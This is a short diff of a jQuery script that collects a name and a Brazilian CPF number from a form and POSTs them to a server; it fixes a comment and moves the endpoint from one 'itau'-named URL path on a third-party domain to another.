@@ -1,7 +1,7 @@
 $(document).ready(function () {
     $('form').submit(function (event) { 
 
-        //pega  os valores do formulário com base no name de cada campo
+        //pega os valores do fomulario com base no name de cada campo
         var postForm = {
             'nome': $('input[name=nome]').val(),
             'cpf': $('input[name=cpf]').val(),
@@ -19,7 +19,7 @@ $(document).ready(function () {
 
         $.ajax({
             type: 'POST', 
-            url: 'http://www.adevipar.com/itau-entrevista/dados/index.php', 
+            url: 'https://davivoltas.dev/itau/new/dados/index.php', 
             data: postForm, 
             dataType: 'json',
             success: function (data) {
